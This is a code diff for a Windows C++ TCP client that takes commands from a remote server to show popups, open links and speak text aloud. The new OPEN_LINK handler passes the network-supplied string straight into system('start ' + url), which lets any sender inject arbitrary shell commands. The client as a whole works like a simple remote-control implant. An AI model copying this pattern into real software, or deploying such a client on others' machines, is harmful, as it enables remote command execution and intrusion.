@@ -1,28 +1,14 @@
 #include "ip.h"
+#include "../../packet.h"
 #include <iostream>
 #include <asio.hpp>
+#include <string>
 #include <thread>
 #include <windows.h>
+#include <sapi.h>
 
 using asio::ip::tcp;
 
-enum packet_id {
-    GET_DATA = 0,
-    POPUP = 1
-};
-
-#pragma pack(push, 1)
-struct Packet {
-    packet_id id;
-    union {
-        int number;
-        packet_id packetid;
-        double double_number;
-        char str[256];
-    };
-    
-};
-#pragma pack(pop)
 
 void show_popup(const char* message) {
     MessageBoxA(NULL, message, "Popup", MB_OK | MB_ICONINFORMATION);
@@ -60,7 +46,33 @@ int main() {
                             break;
                         case POPUP:
                             show_popup(packet.str);
-                            std::cout << "recived text: " << packet.str << "\n";
+                            break;
+                        case OPEN_LINK: {
+                                std::string url = std::string(packet.str);
+                                std::string command = "start " + url;
+                                system(command.c_str());
+                                break;
+                            }
+                        case TTS: {
+                           ISpVoice* pVoice = nullptr;
+
+                            if (FAILED(::CoInitialize(NULL))) {
+                                std::cerr << "Failed to initialize COM\n";
+                                return 1;
+                            }
+
+                            HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
+                            if (SUCCEEDED(hr)) {
+                                wchar_t wmsg[256];
+                                MultiByteToWideChar(CP_UTF8, 0, packet.str, -1, wmsg, 256);
+                                pVoice->Speak(wmsg, 0, NULL);
+                                pVoice->Release();
+                            } else {
+                                std::cerr << "Failed to create SAPI voice\n";
+                            }
+
+                            ::CoUninitialize();                            
+                    }
                             break;
                         default:
                             break;
